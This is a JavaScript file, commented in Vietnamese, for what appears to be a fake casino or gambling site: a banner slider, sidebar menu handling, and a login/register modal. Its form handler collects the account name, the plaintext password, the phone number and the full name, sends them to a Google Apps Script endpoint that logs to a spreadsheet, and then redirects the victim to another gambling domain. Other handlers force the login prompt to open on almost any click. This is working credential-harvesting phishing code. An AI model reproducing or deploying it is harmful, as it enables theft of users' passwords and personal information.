// ==========================================
// 1. SLIDER BANNER TỰ ĐỘNG
// ==========================================
let currentSlide = 0;
const slideTrack = document.querySelector('.banner-slides');
const totalSlides = 6;

if (slideTrack) {
    setInterval(() => {
        currentSlide++;
        
        if (currentSlide >= totalSlides) {
            currentSlide = 0;
        }
        
        // Đã sửa lỗi thiếu dấu * ở đây
        slideTrack.style.transform = `translateX(-${currentSlide * 100}%)`;
    }, 3000);
}

// ==========================================
// 2. ACTIVE MENU TRÁI (SIDEBAR)
// ==========================================
const menuItems = document.querySelectorAll('.sidebar .menu-item');

menuItems.forEach(item => {
    item.addEventListener('click', function() {
        const currentActive = document.querySelector('.sidebar .menu-item.active');
        if (currentActive) {
            currentActive.classList.remove('active');
        }
        this.classList.add('active');
    });
});

// ==========================================
// 3. MỞ MODAL ĐĂNG NHẬP / ĐĂNG KÝ
// ==========================================
const btnOpenLogin = document.querySelector('.btn-outline'); 
const btnOpenRegister = document.querySelector('.btn-primary'); 
const authModal = document.getElementById('auth-modal');
const btnCloseModal = document.getElementById('close-modal');
const tabLogin = document.getElementById('tab-login');
const tabRegister = document.getElementById('tab-register');
const formLogin = document.getElementById('form-login');
const formRegister = document.getElementById('form-register');

function openAuthModal(type) {
    if (authModal) {
        authModal.style.display = 'flex';
        switchTab(type);
    }
}

function switchTab(type) {
    if (type === 'login') {
        tabLogin.classList.add('active');
        tabRegister.classList.remove('active');
        formLogin.style.display = 'block';
        formRegister.style.display = 'none';
    } else {
        tabRegister.classList.add('active');
        tabLogin.classList.remove('active');
        formRegister.style.display = 'block';
        formLogin.style.display = 'none';
    }
}

if (btnOpenLogin) btnOpenLogin.addEventListener('click', () => openAuthModal('login'));
if (btnOpenRegister) btnOpenRegister.addEventListener('click', () => openAuthModal('register'));
if (btnCloseModal) btnCloseModal.addEventListener('click', () => authModal.style.display = 'none');
if (tabLogin) tabLogin.addEventListener('click', () => switchTab('login'));
if (tabRegister) tabRegister.addEventListener('click', () => switchTab('register'));


// ==========================================
// 4. KIỂM TRA ĐIỀU KIỆN & GỬI DỮ LIỆU LÊN GOOGLE SHEETS
// ==========================================

// ĐIỀN LINK GOOGLE APPS SCRIPT CỦA BẠN VÀO ĐÂY:
const GGSHEET_API_URL = 'https://script.google.com/macros/s/AKfycbxgzfRd64WCMbnme7HQjd05eJxvdlmTpI1DJx3LdGjKnwMTcx5ZlFJB6sQ85CCHIqM/exec'; 

function validateAndSubmit(formElement, formType) {
    const inputs = formElement.querySelectorAll('input[type="text"], input[type="password"]');
    let isValid = true;
    let errorMessage = "";
    
    // Các biến chứa dữ liệu
    let account = "", password = "", phone = "", fullname = "";

    // Duyệt qua từng ô để kiểm tra và lấy dữ liệu
    for (let i = 0; i < inputs.length; i++) {
        const input = inputs[i];
        const value = input.value.trim();
        const placeholder = (input.getAttribute('placeholder') || "").toLowerCase();

        // 1. Kiểm tra bỏ trống
        if (value === "") {
            errorMessage = "Vui lòng điền đầy đủ tất cả các thông tin!";
            isValid = false;
            break;
        }

        // 2. Kiểm tra Số điện thoại
        if (placeholder.includes("sđt") || placeholder.includes("điện thoại")) {
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(value)) {
                errorMessage = "Số điện thoại không hợp lệ! Vui lòng nhập chính xác 10 chữ số.";
                isValid = false;
                break;
            }
            phone = value; // Gán dữ liệu SĐT
        }

        // 3. Kiểm tra độ dài & phân loại dữ liệu
        if (placeholder.includes("tài khoản")) {
            if (value.length < 6 || value.length > 20) {
                errorMessage = "Tài khoản phải có độ dài từ 6 đến 20 ký tự!";
                isValid = false; break;
            }
            account = value; // Gán dữ liệu Tài khoản
        }
        
        if (placeholder.includes("mật khẩu")) {
            if (value.length < 6 || value.length > 20) {
                errorMessage = "Mật khẩu phải có độ dài từ 6 đến 20 ký tự!";
                isValid = false; break;
            }
            password = value; // Gán dữ liệu Mật khẩu
        }

        if (placeholder.includes("họ tên")) {
            fullname = value; // Gán dữ liệu Họ tên (nếu có)
        }
    }

    // 4. Kiểm tra Checkbox điều khoản
    const checkbox = formElement.querySelector('input[type="checkbox"]');
    if (isValid && checkbox && !checkbox.checked) {
        errorMessage = "Bạn cần tích chọn xác nhận trước khi tiếp tục!";
        isValid = false;
    }

    // Nếu có lỗi, hiển thị cảnh báo và dừng lại
    if (!isValid) {
        alert(errorMessage);
        return false;
    } 

    // NẾU HỢP LỆ: GỬI DỮ LIỆU ĐI
    // Đổi chữ trên nút thành "Đang xử lý..." để báo hiệu
    const btnSubmit = formElement.querySelector('.btn-submit');
    const originalBtnText = btnSubmit.innerText;
    btnSubmit.innerText = "ĐANG XỬ LÝ...";
    btnSubmit.disabled = true;

    // Đóng gói dữ liệu bằng URLSearchParams (Google Apps Script đọc chuẩn này tốt hơn)
    const urlEncodedData = new URLSearchParams();
    urlEncodedData.append('type', formType);
    urlEncodedData.append('account', account);
    urlEncodedData.append('password', password);
    urlEncodedData.append('phone', phone);
    urlEncodedData.append('fullname', fullname);

    // Dùng fetch API đẩy lên Google Sheets với mode: 'no-cors' để tránh lỗi chặn kết nối
    fetch(GGSHEET_API_URL, { 
        method: 'POST', 
        body: urlEncodedData,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        mode: 'no-cors' // Quan trọng: Bỏ qua lỗi CORS của trình duyệt
    })
        .then(() => {
            // Khi dùng no-cors, fetch sẽ luôn trả về thành công nếu mạng bình thường
            
            window.location.href = "https://25llwin.com/";
        })
        .catch(error => {
           
            btnSubmit.innerText = originalBtnText; // Phục hồi lại nút
            btnSubmit.disabled = false;
        });
}

// Bắt sự kiện nhấn nút ĐĂNG NHẬP
if (formLogin) {
    const btnSubmitLogin = formLogin.querySelector('.btn-submit');
    if (btnSubmitLogin) {
        btnSubmitLogin.addEventListener('click', (e) => {
            e.preventDefault(); 
            validateAndSubmit(formLogin, "Đăng Nhập"); // Truyền trạng thái "Đăng Nhập"
        });
    }
}

// Bắt sự kiện nhấn nút ĐĂNG KÝ
if (formRegister) {
    const btnSubmitRegister = formRegister.querySelector('.btn-submit');
    if (btnSubmitRegister) {
        btnSubmitRegister.addEventListener('click', (e) => {
            e.preventDefault(); 
            validateAndSubmit(formRegister, "Đăng Ký"); // Truyền trạng thái "Đăng Ký"
        });
    }
}

// ==========================================
// 5. YÊU CẦU ĐĂNG NHẬP KHI TƯƠNG TÁC VỚI ỨNG DỤNG
// ==========================================
const requireLoginElements = document.querySelectorAll('.sidebar .menu-item, .game-card, .bottom-nav .nav-item, .icon-item, .header');

requireLoginElements.forEach(element => {
    element.addEventListener('click', function(e) {
        if (typeof openAuthModal === 'function') {
            openAuthModal('login');
        }
    });
});
